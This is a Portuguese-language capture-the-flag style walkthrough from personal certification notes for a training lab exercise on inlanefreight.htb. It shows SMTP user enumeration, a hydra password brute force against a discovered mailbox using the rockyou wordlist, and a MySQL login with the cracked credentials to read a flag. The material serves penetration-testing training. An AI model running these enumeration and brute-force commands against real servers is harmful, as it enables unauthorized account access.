> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/attacking-common-services-easy.md).

# Attacking Common Services - Easy

1. Você está mirando o domínio inlanefreight.htb. Avalie o servidor alvo e obtenha o conteúdo do arquivo flag.txt. Envie-o como resposta.

**Enumeração**

* **Nmap**

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FfrNg8tJaCJ9Yr8Eru7cB%2Fimage.png?alt=media&amp;token=7d50ee46-edfd-4e60-90cb-0221adef72bb" alt=""><figcaption></figcaption></figure>

* Enumerando o `smtp` descobrimos que existe um email

```sh
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.233.238
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FKdk9u5CqePK7sSru5ncU%2Fimage.png?alt=media&amp;token=dd56eadf-3049-4396-8961-42ccdd97119d" alt=""><figcaption></figcaption></figure>

* Após descobrir o email vamos tentar quebrá-lo usando a ferramenta hydra

```sh
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt 10.129.233.238 smtp -t 64
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2Fdg6cDiOKMeBCHzh2RP3G%2Fimage.png?alt=media&amp;token=09cdbcf1-cc1e-4c55-a6d5-ba5f1ae9120b" alt=""><figcaption></figcaption></figure>

* Tentamos login no `smtp` mas não deu certo, então tentamos fazer login com as credenciais encontradas no servidor mysql e lemos a flag

```
mysql -u fiona -p987654321 -h 10.129.233.238
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FI24RoVuRRE7gIiTRa14d%2Fimage.png?alt=media&amp;token=7eb4cd87-e67a-4dbc-9373-b78cea0ea6d9" alt=""><figcaption></figcaption></figure>
